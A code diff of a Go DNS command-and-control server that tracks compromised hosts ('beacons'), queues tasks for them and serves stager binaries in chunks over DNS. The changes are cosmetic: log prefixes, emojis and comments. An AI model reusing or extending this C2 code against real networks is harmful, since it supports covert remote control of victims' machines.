@@ -31,8 +31,8 @@ type Beacon struct {
 	FirstSeen   time.Time `json:"first_seen"`
 	LastSeen    time.Time `json:"last_seen"`
 	IPAddress   string    `json:"ip_address"`
-	TaskQueue   []Task    `json:"-"` // Don't serialize tasks
-	CurrentTask string    `json:"-"` // ID of task currently assigned (not yet completed)
+	TaskQueue   []Task    `json:"-"`
+	CurrentTask string    `json:"-"`
 }
 
 // Task represents a command task for a beacon
@@ -126,8 +126,8 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 	// Initialize database
 	db, err := NewDatabase(dbPath)
 	if err != nil {
-		logf("[C2] WARNING: Failed to initialize database: %v", err)
-		logf("[C2] Running in memory-only mode (data will not persist)")
+		logf("[DB] WARNING: Failed to initialize database: %v", err)
+		logf("[DB] Running in memory-only mode (data will not persist)")
 		db = nil
 	}
 
@@ -153,11 +153,11 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 	// Load existing beacons from database
 	if c2.db != nil {
 		if err := c2.loadBeaconsFromDB(); err != nil {
-			logf("[C2] WARNING: Failed to load beacons from database: %v", err)
+			logf("[DB] WARNING: Failed to load beacons from database: %v", err)
 		}
 		// Load existing tasks from database
 		if err := c2.loadTasksFromDB(); err != nil {
-			logf("[C2] WARNING: Failed to load tasks from database: %v", err)
+			logf("[DB] WARNING: Failed to load tasks from database: %v", err)
 		}
 	}
 
@@ -184,11 +184,11 @@ func (c2 *C2Manager) loadBeaconsFromDB() error {
 
 	for _, beacon := range beacons {
 		c2.beacons[beacon.ID] = beacon
-		logf("[C2] Loaded beacon from database: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
+		logf("[DB] Loaded beacon from database: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
 	}
 
 	if len(beacons) > 0 {
-		logf("[C2] Loaded %d beacon(s) from database", len(beacons))
+		logf("[DB] Loaded %d beacon(s) from database", len(beacons))
 	}
 
 	return nil
@@ -229,7 +229,7 @@ func (c2 *C2Manager) loadTasksFromDB() error {
 	}
 
 	if len(tasks) > 0 {
-		logf("[C2] Loaded %d task(s) from database", len(tasks))
+		logf("[DB] Loaded %d task(s) from database", len(tasks))
 	}
 
 	return nil
@@ -248,14 +248,14 @@ func (c2 *C2Manager) periodicDBCleanup() {
 		// Clean up old completed tasks (older than 30 days by default)
 		if err := c2.db.CleanupOldData(30); err != nil {
 			if c2.debug {
-				logf("[C2] Database cleanup error: %v", err)
+				logf("[DB] Database cleanup error: %v", err)
 			}
 		}
 
 		// Log database stats in debug mode
 		if c2.debug {
 			if stats, err := c2.db.GetDatabaseStats(); err == nil {
-				logf("[C2] DB Stats: %d beacons, %d active, %d tasks",
+				logf("[DB] DB Stats: %d beacons, %d active, %d tasks",
 					stats["beacons"], stats["active_beacons"], stats["tasks"])
 			}
 		}
@@ -559,8 +559,6 @@ func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
 	return decoded, nil
 }
 
-// isLegitimateSubdomain checks if a subdomain looks like a legitimate DNS name
-// rather than encoded C2 data
 // isLegitimateSubdomain determines if a DNS subdomain represents legitimate traffic
 // rather than encoded C2 communications based on pattern analysis.
 func isLegitimateSubdomain(subdomain string) bool {
@@ -597,7 +595,6 @@ func isLegitimateSubdomain(subdomain string) bool {
 	return false
 }
 
-// looksLikeBase36 checks if a string looks like base36-encoded C2 data
 // looksLikeBase36 analyzes a string to determine if it appears to be Base36-encoded data
 // based on length, character distribution, and entropy characteristics.
 func looksLikeBase36(s string) bool {
@@ -1203,7 +1200,6 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	taskID := parts[2]
 	result := parts[3]
 
-	// Special handling for domains_updated acknowledgments
 	// These are sent after update_domains tasks and may arrive at DNS servers
 	// that didn't assign the original task (cross-server domain updates)
 	if result == "domains_updated" {
@@ -1761,7 +1757,7 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 		`)
 
 		if err != nil {
-			logf("[C2] ⚠️  Error querying stager_chunk_cache: %v", err)
+			logf("[C2] Error querying stager_chunk_cache: %v", err)
 		} else {
 			defer rows.Close()
 			if rows.Next() {
@@ -1808,7 +1804,7 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 							}
 						} else if masterSessionID != sessionID {
 							// This should never happen with deterministic IDs, but log if it does
-							logf("[C2] ⚠️  Session ID mismatch! Local: %s, Master: %s", sessionID, masterSessionID)
+							logf("[C2] Session ID mismatch! Local: %s, Master: %s", sessionID, masterSessionID)
 						}
 					}()
 
@@ -1825,7 +1821,7 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 		// Cache miss - NO FALLBACK to creating new session
 		// The cache should have been pushed when Master built the stager
 		if !isDuplicate {
-			logf("[C2] ❌ Cache MISS for stager - no cached binary available!")
+			logf("[C2] Cache MISS for stager - no cached binary available!")
 			logf("[C2] Stager sessions should be created by Master build, not DNS server")
 		}
 		return "ERROR|NO_CACHE"
@@ -1858,14 +1854,14 @@ func (c2 *C2Manager) handleStagerChunkRequestNew(chunkIndex int, stagerIP string
 		// Try to find ANY cached binary and serve from that
 		// The stager embeds the client_binary_id implicitly via the domain list
 		if !isDuplicate {
-			logf("[C2] ⚠️  Session %s not in local cache, searching for cached chunks", sessionID)
+			logf("[C2] Session %s not in local cache, searching for cached chunks", sessionID)
 		}
 
 		// Use database method with proper mutex handling
 		clientBinaryID, err := c2.db.GetCachedBinaryID()
 		if err != nil {
 			if !isDuplicate {
-				logf("[C2] ❌ No cached chunks available: %v", err)
+				logf("[C2] No cached chunks available: %v", err)
 			}
 			return "ERROR|NO_CACHE"
 		}
@@ -1909,7 +1905,7 @@ func (c2 *C2Manager) handleStagerChunkRequestNew(chunkIndex int, stagerIP string
 		c2.mutex.Unlock()
 
 		if !isDuplicate {
-			logf("[C2] ✅ Session %s created with %d chunks available", sessionID, totalChunks)
+			logf("[C2] Session %s created with %d chunks available", sessionID, totalChunks)
 		}
 
 		hasCachedSession = true
@@ -1921,13 +1917,13 @@ func (c2 *C2Manager) handleStagerChunkRequestNew(chunkIndex int, stagerIP string
 	chunkData, err := c2.db.GetCachedChunkByBinaryID(clientBinaryID, chunkIndex)
 	if err != nil {
 		if !isDuplicate {
-			logf("[C2] ❌ Chunk %d not in cache for binary %s: %v", chunkIndex, clientBinaryID, err)
+			logf("[C2] Chunk %d not in cache for binary %s: %v", chunkIndex, clientBinaryID, err)
 		}
 		return "ERROR|CHUNK_NOT_FOUND"
 	}
 
 	if !isDuplicate {
-		logf("[C2] ✅ Serving chunk %d from cache (instant)", chunkIndex)
+		logf("[C2] Serving chunk %d from cache (instant)", chunkIndex)
 	}
 
 	// Update session stats if we have the session
@@ -2151,7 +2147,7 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 
 			// Cache miss for this specific chunk - fall through to Master query
 			if !isDuplicate {
-				logf("[C2] ⚠️  Cache miss for chunk %d in cached session, querying Master", chunkIndex)
+				logf("[C2] Cache miss for chunk %d in cached session, querying Master", chunkIndex)
 			}
 		}
 
@@ -2159,7 +2155,7 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 		cachedChunk, err := c2.db.GetCachedChunk(sessionID, chunkIndex)
 		if err == nil && cachedChunk != "" {
 			if !isDuplicate {
-				logf("[C2] 🚀 Cache HIT: chunk %d for session %s (instant response)", chunkIndex, sessionID)
+				logf("[C2] Cache HIT: chunk %d for session %s (instant response)", chunkIndex, sessionID)
 			}
 			return fmt.Sprintf("CHUNK|%s", cachedChunk)
 		}
